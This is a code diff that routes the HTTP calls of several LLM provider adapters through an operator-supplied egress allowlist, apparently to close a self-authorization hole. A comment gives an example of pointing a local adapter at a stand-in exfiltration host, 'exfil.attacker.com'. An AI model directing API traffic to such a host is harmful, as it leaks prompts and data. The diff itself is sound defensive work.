@@ -113,7 +113,8 @@ class SafeLLMAdapter(ABC):
 
     def __init__(self, mode_controller=None, invariant_guard=None,
                  uncertainty_layer=None, sycophancy_detector=None,
-                 audit=None, narrator=None, model: str = ""):
+                 audit=None, narrator=None, model: str = "",
+                 egress_policy=None):
         self.mode_controller = mode_controller
         self.invariant_guard = invariant_guard
         self.uncertainty     = uncertainty_layer
@@ -122,6 +123,80 @@ class SafeLLMAdapter(ABC):
         self.narrator        = narrator
         self.model           = model
         self.call_log        = []
+        # Operator-supplied destination authorization. None means this adapter
+        # cannot reach the network — refusing is the safe failure.
+        self.egress_policy   = egress_policy
+
+    # ── the one door for provider traffic ────────────────────────────
+    #
+    # Every adapter used to call urllib.request.urlopen directly: four sites,
+    # each sending a full JSON body and an API key to an external host, none of
+    # them consulting the egress allowlist. They now share this method, so the
+    # door is structural rather than repeated in four places where the next
+    # adapter would forget it.
+    #
+    # TRUST DIRECTION — the important part, and it was wrong in the first cut.
+    # That version built its own EgressPolicy and appended whatever base URL it
+    # had been handed:
+    #
+    #     if base not in allow: allow.append(base)      # <-- self-authorization
+    #
+    # which turned "human declares destination, guard verifies it" into "adapter
+    # declares destination, guard verifies the adapter's own declaration".
+    # `LocalAdapter(base_url="https://exfil.attacker.com/v1")` authorized itself.
+    # Red team (ChatGPT, 2026-08) called it authorization confused with
+    # configuration, and that is exactly what it was.
+    #
+    # The adapter now CONSUMES an egress policy it cannot create. It may say "I
+    # want to contact X"; only the operator's policy answers whether X is
+    # allowed. An adapter with no injected policy cannot reach the network at
+    # all — refusing is the safe failure, and a default policy would just be
+    # self-authorization with extra steps.
+    #
+    # WHY THE DESTINATION LAYER AND NOT THE SHAPE LAYER: an LLM prompt IS free
+    # text — that is the whole point of the call — and request_schema has no
+    # FREE_TEXT type on purpose. Declaring a schema that permits arbitrary prose
+    # would look constrained while constraining nothing. So provider calls are
+    # gated on WHERE they may go. The body is NOT covered, which means an
+    # authorized provider request remains an information-flow channel: see
+    # THREAT_MODEL_exfiltration.md. Destination security and information-flow
+    # security are different properties and this method only provides the first.
+
+    def _guarded_post(self, url: str, payload: dict, headers: dict,
+                      timeout: float = 60.0) -> dict:
+        """POST JSON to a provider through an OPERATOR-SUPPLIED egress policy.
+
+        `self.egress_policy` must be set by the caller (constructor kwarg or
+        attribute). This method never creates or extends a policy.
+        """
+        import json as _json
+        from driftcore.kernel.egress_guard import (
+            EgressGuard, GuardedEgress, EgressRefused,
+        )
+        from driftcore.kernel.one_door_client import PinnedHTTPTransport
+
+        policy = getattr(self, "egress_policy", None)
+        if policy is None:
+            raise RuntimeError(
+                "no egress policy configured for this adapter. A destination is "
+                "authorized by the operator, never by the adapter that wants to "
+                "reach it — pass egress_policy=EgressPolicy.build([...], "
+                "declared_by=<operator>) when constructing the adapter.")
+
+        guard = EgressGuard(policy)
+        egress = GuardedEgress(guard, PinnedHTTPTransport(timeout=timeout))
+
+        body = _json.dumps(payload).encode()
+        try:
+            status, _resp_headers, data = egress.request(
+                url, method="POST", body=body,
+                headers={**headers, "content-type": "application/json"})
+        except EgressRefused as e:
+            raise RuntimeError(
+                f"provider call refused by the egress guard: {e}") from None
+        if status >= 400:
+            raise RuntimeError(f"provider returned HTTP {status}")
+        return _json.loads(data)
 
     # ── The one public entry point ────────────────────────────
 
@@ -233,22 +308,16 @@ class AnthropicAdapter(SafeLLMAdapter):
         super().__init__(model=model, **kw)
 
     def _raw_call(self, system, prompt, max_tokens):
-        import urllib.request
         key = os.environ.get("ANTHROPIC_API_KEY")
         if not key:
             raise RuntimeError("ANTHROPIC_API_KEY not set in environment")
-        req = urllib.request.Request(
+        data = self._guarded_post(
             "https://api.anthropic.com/v1/messages",
-            data=json.dumps({
-                "model": self.model, "max_tokens": max_tokens,
-                "system": system,
-                "messages": [{"role": "user", "content": prompt}],
-            }).encode(),
-            headers={"x-api-key": key,
-                     "anthropic-version": "2023-06-01",
-                     "content-type": "application/json"})
-        with urllib.request.urlopen(req, timeout=60) as r:
-            data = json.loads(r.read())
+            {"model": self.model, "max_tokens": max_tokens,
+             "system": system,
+             "messages": [{"role": "user", "content": prompt}]},
+            {"x-api-key": key, "anthropic-version": "2023-06-01"},
+            timeout=60)
         return "".join(b.get("text", "") for b in data.get("content", []))
 
 
@@ -259,21 +328,15 @@ class OpenAIAdapter(SafeLLMAdapter):
         super().__init__(model=model, **kw)
 
     def _raw_call(self, system, prompt, max_tokens):
-        import urllib.request
         key = os.environ.get("OPENAI_API_KEY")
         if not key:
             raise RuntimeError("OPENAI_API_KEY not set in environment")
-        req = urllib.request.Request(
+        data = self._guarded_post(
             "https://api.openai.com/v1/chat/completions",
-            data=json.dumps({
-                "model": self.model, "max_tokens": max_tokens,
-                "messages": [{"role": "system", "content": system},
-                             {"role": "user", "content": prompt}],
-            }).encode(),
-            headers={"Authorization": f"Bearer {key}",
-                     "content-type": "application/json"})
-        with urllib.request.urlopen(req, timeout=60) as r:
-            data = json.loads(r.read())
+            {"model": self.model, "max_tokens": max_tokens,
+             "messages": [{"role": "system", "content": system},
+                          {"role": "user", "content": prompt}]},
+            {"Authorization": f"Bearer {key}"}, timeout=60)
         return data["choices"][0]["message"]["content"]
 
 
@@ -285,21 +348,15 @@ class XAIAdapter(OpenAIAdapter):
         SafeLLMAdapter.__init__(self, model=model, **kw)
 
     def _raw_call(self, system, prompt, max_tokens):
-        import urllib.request
         key = os.environ.get("XAI_API_KEY")
         if not key:
             raise RuntimeError("XAI_API_KEY not set in environment")
-        req = urllib.request.Request(
+        data = self._guarded_post(
             "https://api.x.ai/v1/chat/completions",
-            data=json.dumps({
-                "model": self.model, "max_tokens": max_tokens,
-                "messages": [{"role": "system", "content": system},
-                             {"role": "user", "content": prompt}],
-            }).encode(),
-            headers={"Authorization": f"Bearer {key}",
-                     "content-type": "application/json"})
-        with urllib.request.urlopen(req, timeout=60) as r:
-            data = json.loads(r.read())
+            {"model": self.model, "max_tokens": max_tokens,
+             "messages": [{"role": "system", "content": system},
+                          {"role": "user", "content": prompt}]},
+            {"Authorization": f"Bearer {key}"}, timeout=60)
         return data["choices"][0]["message"]["content"]
 
 
@@ -313,17 +370,12 @@ class LocalAdapter(OpenAIAdapter):
         self.base_url = base_url
 
     def _raw_call(self, system, prompt, max_tokens):
-        import urllib.request
-        req = urllib.request.Request(
+        data = self._guarded_post(
             f"{self.base_url}/chat/completions",
-            data=json.dumps({
-                "model": self.model, "max_tokens": max_tokens,
-                "messages": [{"role": "system", "content": system},
-                             {"role": "user", "content": prompt}],
-            }).encode(),
-            headers={"content-type": "application/json"})
-        with urllib.request.urlopen(req, timeout=120) as r:
-            data = json.loads(r.read())
+            {"model": self.model, "max_tokens": max_tokens,
+             "messages": [{"role": "system", "content": system},
+                          {"role": "user", "content": prompt}]},
+            {}, timeout=120)
         return data["choices"][0]["message"]["content"]
 
 
